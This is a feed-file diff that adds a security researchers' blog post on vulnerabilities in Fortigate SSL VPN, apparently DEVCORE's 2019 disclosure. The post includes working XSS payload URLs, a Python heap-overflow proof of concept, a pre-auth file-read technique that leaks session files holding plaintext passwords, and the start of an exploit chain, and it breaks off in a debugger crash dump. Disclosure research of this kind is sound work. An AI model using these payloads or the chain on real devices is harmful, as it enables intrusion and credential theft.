@@ -4,7 +4,7 @@
  <title>DEVCORE 戴夫寇爾</title>
  <link href="https://devco.re/" rel="self"/>
  <link href="https://devco.re"/>
- <updated>2019-07-23T13:18:26+08:00</updated>
+ <updated>2019-08-09T15:11:54-07:00</updated>
  <id>https://devco.re</id>
  <author>
    <name>DEVCORE</name>
@@ -13,9 +13,322 @@
 
  
  <entry>
-   <title>DEVCORE 徵求行政專員</title>
+   <title>Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN</title>
+   <link href="https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/"/>
+   <updated>2019-08-09T00:00:00-07:00</updated>
+   <id>https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn</id>
+   <content type="html">&lt;p&gt;Author: Meh Chang(&lt;a href=&quot;https://twitter.com/mehqq_&quot;&gt;@mehqq_&lt;/a&gt;) and Orange Tsai(&lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;)&lt;/p&gt;
+
+&lt;p&gt;Last month, we talked about &lt;a href=&quot;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&quot;&gt;Palo Alto Networks GlobalProtect RCE&lt;/a&gt; as an appetizer. Today, here comes the main dish! If you cannot go to Black Hat or DEFCON for our talk, or you are interested in more details, here is the slides for you!&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://i.blackhat...&quot;&gt;Infiltrating Corporate Intranet Like NSA: Pre-auth RCE on Leading SSL VPNs&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;em&gt;P.S. It seems the slides link on Black Hat official website is dead, it should be up ASAP&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;We will also give a speech at the following conferences, just come and find us!&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://hitcon.org/2019/CMT/agenda&quot;&gt;HITCON&lt;/a&gt; - Aug. 23 @ Taipei (Chinese)&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://gsec.hitb.org/sg2019/agenda/&quot;&gt;HITB GSEC&lt;/a&gt; - Aug. 29,30 @ Singapore&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.romhack.io/program_en-2019.html&quot;&gt;RomHack&lt;/a&gt; - Sep. 28 @ Rome&lt;/li&gt;
+  &lt;li&gt;and more …&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;lets-start&quot;&gt;Let’s start!&lt;/h1&gt;
+
+&lt;p&gt;The story began in last August, when we started a new research project on SSL VPN. Compare to the site-to-site VPN such as the IPSEC and PPTP, SSL VPN is more easy to use and compatible with any network environments. For its convenience, SSL VPN becomes the most popular remote access way for enterprise!&lt;/p&gt;
+
+&lt;p&gt;However, what if this trusted equipment is insecure? It is an important corporate asset but a blind spot of corporation. According to our survey on Fortune 500, the Top-3 SSL VPN vendors dominate about 75% market share. The diversity of SSL VPN is narrow. Therefore, once we find a critical vulnerability on the leading SSL VPN, the impact is huge. There is no way to stop us because SSL VPN must be exposed to the internet.&lt;/p&gt;
+
+&lt;p&gt;At the beginning of our research, we made a little survey on the CVE amount of leading SSL VPN vendors:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It seems like Fortinet and Pulse Secure are the most secure ones. Is that true? As a myth buster, we took on this challenge and started hacking Fortinet and Pulse Secure! This story is about hacking &lt;strong&gt;Fortigate SSL VPN&lt;/strong&gt;. The next article is going to be about &lt;strong&gt;Pulse Secure&lt;/strong&gt;, which is the most splendid one! Stay tuned!&lt;/p&gt;
+
+&lt;h1 id=&quot;fortigate-ssl-vpn&quot;&gt;Fortigate SSL VPN&lt;/h1&gt;
+
+&lt;p&gt;Fortinet calls their SSL VPN product line as Fortigate SSL VPN, which is prevalent among end users and medium-sized enterprise. There are more than 480k servers operating on the internet and is common in Asia and Europe. We can identify it from the URL &lt;code class=&quot;highlighter-rouge&quot;&gt;/remote/login&lt;/code&gt;. Here is the technical feature of Fortigate:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;All-in-one binary&lt;br /&gt;
+  We started our research from the file system. We tried to list the binaries in &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/&lt;/code&gt; and found there are all symbolic links, pointing to &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/init&lt;/code&gt;. Just like this:&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;Fortigate compiles all the programs and configurations into a single binary, which makes the &lt;code class=&quot;highlighter-rouge&quot;&gt;init&lt;/code&gt; really huge. It contains thousands of functions and there is no symbol! It only contains necessary programs for the SSL VPN, so the environment is really inconvenient for hackers. For example, there is even no &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/ls&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/cat&lt;/code&gt;!&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Web daemon&lt;br /&gt;
+  There are 2 web interfaces running on the Fortigate. One is for the admin interface, handled with &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/httpsd&lt;/code&gt; on the port 443. The other is normal user interface, handled with &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sslvpnd&lt;/code&gt; on the port 4433 by default. Generally, the admin page should be restricted from the internet, so we can only access the user interface.&lt;/p&gt;
+
+    &lt;p&gt;Through our investigation, we found the web server is modified from apache, but it is the apache from 2002. Apparently they modified apache in 2002 and added their own additional functionality. We can map the source code of apache to speed up our analysis.&lt;/p&gt;
+
+    &lt;p&gt;In both web service, they also compiled their own apache modules into the binary to handle each URL path. We can find a table specifying the handlers and dig into them!&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;WebVPN&lt;br /&gt;
+  WebVPN is a convenient proxy feature which allows us connect to all the services simply through a browser. It supports many protocols, like HTTP, FTP, RDP. It can also handle various web resources, such as WebSocket and Flash. To process a website correctly, it parses the HTML and rewrites all the URLs for us. This involves heavy string operation, which is prone to memory bugs.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;vulnerabilities&quot;&gt;Vulnerabilities&lt;/h1&gt;
+
+&lt;p&gt;We found several vulnerabilities:&lt;/p&gt;
+
+&lt;h3 id=&quot;cve-2018-13379-pre-auth-arbitrary-file-reading&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-384&quot;&gt;CVE-2018-13379&lt;/a&gt;: Pre-auth arbitrary file reading&lt;/h3&gt;
+&lt;p&gt;While fetching corresponding language file, it builds the json file path with the parameter &lt;code class=&quot;highlighter-rouge&quot;&gt;lang&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/migadmin/lang/%s.json&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;There is no protection, but a file extension appended automatically. It seems like we can only read json file. However, actually we can abuse the feature of &lt;code class=&quot;highlighter-rouge&quot;&gt;snprintf&lt;/code&gt;. According to the man page, it writes &lt;strong&gt;at most size-1&lt;/strong&gt; into the output string. Therefore, we only need to make it exceed the buffer size and the &lt;code class=&quot;highlighter-rouge&quot;&gt;.json&lt;/code&gt; will be stripped. Then we can read whatever we want.&lt;/p&gt;
+
+&lt;h3 id=&quot;cve-2018-13380-pre-auth-xss&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-383&quot;&gt;CVE-2018-13380&lt;/a&gt;: Pre-auth XSS&lt;/h3&gt;
+&lt;p&gt;There are several XSS:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1)%3C/script%3E
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/remote/loginredir?redir=6a6176617363726970743a616c65727428646f63756d656e742e646f6d61696e29
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/message?title=x&amp;amp;msg=%26%23&amp;lt;svg/onload=alert(1)&amp;gt;;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;cve-2018-13381-pre-auth-heap-overflow&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-387&quot;&gt;CVE-2018-13381&lt;/a&gt;: Pre-auth heap overflow&lt;/h3&gt;
+&lt;p&gt;While encoding HTML entities code, there are 2 stages. The server first calculate the required buffer length for encoded string. Then it encode into the buffer. In the calculation stage, for example, encode string for &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;#60;&lt;/code&gt; and this should occupies 5 bytes. If it encounter anything starts with &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;#&lt;/code&gt;, such as &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;#60;&lt;/code&gt;, it consider there is a token already encoded, and count its length directly. Like this:&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;(&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;)&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;#&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;&amp;lt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;&amp;gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;&amp;amp;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;#&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;However, there is an inconsistency between length calculation and encoding process. The encode part does not handle that much.&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;&amp;lt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;#60;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;&amp;gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If we input a malicious string like &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;#&amp;lt;&amp;lt;&amp;lt;;&lt;/code&gt;, the &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt; is still encoded into &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;#60;&lt;/code&gt;, so the result should be &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;#&amp;amp;#60;&amp;amp;#60;&amp;amp;#60;;&lt;/code&gt;! This is much longer than the expected length 6 bytes, so it leads to a heap overflow.&lt;/p&gt;
+
+&lt;p&gt;PoC:&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&#39;title&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;x&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
+    &lt;span class=&quot;s&quot;&gt;&#39;msg&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&amp;amp;#&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&amp;lt;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;;&amp;lt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;https://sslvpn:4433/message&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;cve-2018-13382-the-magic-backdoor&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-389&quot;&gt;CVE-2018-13382&lt;/a&gt;: The magic backdoor&lt;/h3&gt;
+&lt;p&gt;In the login page, we found a special parameter called &lt;code class=&quot;highlighter-rouge&quot;&gt;magic&lt;/code&gt;. Once the parameter meets a hardcoded string, we can modify any user’s password.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;According to our survey, there are still plenty of Fortigate SSL VPN lack of patch. Therefore, considering its severity, we will not disclose the magic string. However, this vulnerability has been &lt;a href=&quot;https://twitter.com/codewhitesec/status/1145967317672714240&quot;&gt;reproduced by the researcher from CodeWhite&lt;/a&gt;. It is surely that other attackers will exploit this vulnerability soon! Please update your Fortigate ASAP!&lt;/p&gt;
+
+&lt;blockquote class=&quot;twitter-tweet&quot; data-lang=&quot;zh-tw&quot;&gt;&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;Critical vulns in &lt;a href=&quot;https://twitter.com/hashtag/FortiOS?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#FortiOS&lt;/a&gt; reversed &amp;amp; exploited by our colleagues &lt;a href=&quot;https://twitter.com/niph_?ref_src=twsrc%5Etfw&quot;&gt;@niph_&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/ramoliks?ref_src=twsrc%5Etfw&quot;&gt;@ramoliks&lt;/a&gt; - patch your &lt;a href=&quot;https://twitter.com/hashtag/FortiOS?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#FortiOS&lt;/a&gt; asap and see the &lt;a href=&quot;https://twitter.com/hashtag/bh2019?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#bh2019&lt;/a&gt; talk of &lt;a href=&quot;https://twitter.com/orange_8361?ref_src=twsrc%5Etfw&quot;&gt;@orange_8361&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/mehqq_?ref_src=twsrc%5Etfw&quot;&gt;@mehqq_&lt;/a&gt; for details (tnx guys for the teaser that got us started) &lt;a href=&quot;https://t.co/TLLEbXKnJ4&quot;&gt;pic.twitter.com/TLLEbXKnJ4&lt;/a&gt;&lt;/p&gt;&amp;mdash; Code White GmbH (@codewhitesec) &lt;a href=&quot;https://twitter.com/codewhitesec/status/1145967317672714240?ref_src=twsrc%5Etfw&quot;&gt;2019年7月2日&lt;/a&gt;&lt;/blockquote&gt;
+&lt;script async=&quot;&quot; src=&quot;https://platform.twitter.com/widgets.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;
+
+&lt;h3 id=&quot;cve-2018-13383-post-auth-heap-overflow&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-388&quot;&gt;CVE-2018-13383&lt;/a&gt;: Post-auth heap overflow&lt;/h3&gt;
+
+&lt;p&gt;This is a vulnerability on the WebVPN feature. While parsing JavaScript in the HTML, it tries to copy content into a buffer with the following code:&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;js_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;js_buf_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The buffer size is fixed to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x2000&lt;/code&gt;, but the input string is unlimited. Therefore, here is a heap overflow. It is worth to note that this vulnerability can overflow Null byte, which is useful in our exploitation.&lt;br /&gt;
+To trigger this overflow, we need to put our exploit on an HTTP server, and then ask the SSL VPN to proxy our exploit as a normal user.&lt;/p&gt;
+
+&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;
+
+&lt;p&gt;The official advisory described no RCE risk at first. Actually, it was a misunderstanding. We will show you how to exploit from the user login interface without authentication.&lt;/p&gt;
+
+&lt;h3 id=&quot;cve-2018-13381&quot;&gt;CVE-2018-13381&lt;/h3&gt;
+&lt;p&gt;Our first attempt is exploiting the pre-auth heap overflow. However, there is a fundamental defect of this vulnerability – It does not overflow Null bytes. In general, this is not a serious problem. The heap exploitation techniques nowadays should overcome this. However, we found it a disaster doing heap feng shui on Fortigate. There are several obstacles, making the heap unstable and hard to be controlled.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Single thread, single process, single allocator&lt;br /&gt;
+  The web daemon handles multiple connection with &lt;code class=&quot;highlighter-rouge&quot;&gt;epoll()&lt;/code&gt;, no multi-process or multi-thread, and the main process and libraries use the same heap, called JeMalloc. It means, all the memory allocations from all the operations of all the connections are on the same heap. Therefore, the heap is really messy.&lt;/li&gt;
+  &lt;li&gt;Operations regularly triggered&lt;br /&gt;
+  This interferes the heap but is uncontrollable. We cannot arrange the heap carefully because it would be destroyed.&lt;/li&gt;
+  &lt;li&gt;Apache additional memory management. &lt;br /&gt;
+  The memory won’t be &lt;code class=&quot;highlighter-rouge&quot;&gt;free()&lt;/code&gt; until the connection ends. We cannot arrange the heap in a single connection. Actually this can be an effective mitigation for heap vulnerabilities especially for use-after-free.&lt;/li&gt;
+  &lt;li&gt;JeMalloc&lt;br /&gt;
+  JeMalloc isolates meta data and user data, so it is hard to modify meta data and play with the heap management. Moreover, it centralizes small objects, which also limits our exploit.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;We were stuck here, and then we chose to try another way. If anyone exploits this successfully, please teach us!&lt;/p&gt;
+
+&lt;h3 id=&quot;cve-2018-13379--cve-2018-13383&quot;&gt;CVE-2018-13379 + CVE-2018-13383&lt;/h3&gt;
+&lt;p&gt;This is a combination of pre-auth file reading and post-auth heap overflow. One for gaining authentication and one for getting a shell.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Gain authentication&lt;br /&gt;
+  We first use CVE-2018-13379 to leak the session file. The session file contains valuable information, such as username and plaintext password, which let us login easily.&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Get the shell&lt;br /&gt;
+  After login, we can ask the SSL VPN to proxy the exploit on our malicious HTTP server, and then trigger the heap overflow.&lt;/p&gt;
+
+    &lt;p&gt;Due to the problems mentioned above, we need a nice target to overflow. We cannot control the heap carefully, but maybe we can find something &lt;strong&gt;regularly&lt;/strong&gt; appears! It would be great if it is &lt;strong&gt;everywhere&lt;/strong&gt;, and every time we trigger the bug, we can overflow it easily! However, it is a hard work to find such a target from this huge program, so we were stuck at that time … and we started to fuzz the server, trying to get something useful.&lt;/p&gt;
+
+    &lt;p&gt;We got an interesting crash. To our great surprise, we almost control the program counter!&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;Here is the crash, and that’s why we love fuzzing! ;)&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  Program received signal SIGSEGV, Segmentation fault.
+  0x00007fb908d12a77 in SSL_do_handshake () from /fortidev4-x86_64/lib/libssl.so.1.1
+  2: /x $rax = 0x41414141
+  1: x/i $pc
+  =&amp;gt; 0x7fb908d12a77 &amp;lt;SSL_do_handshake+23&amp;gt;: callq *0x60(%rax)
+  (gdb)
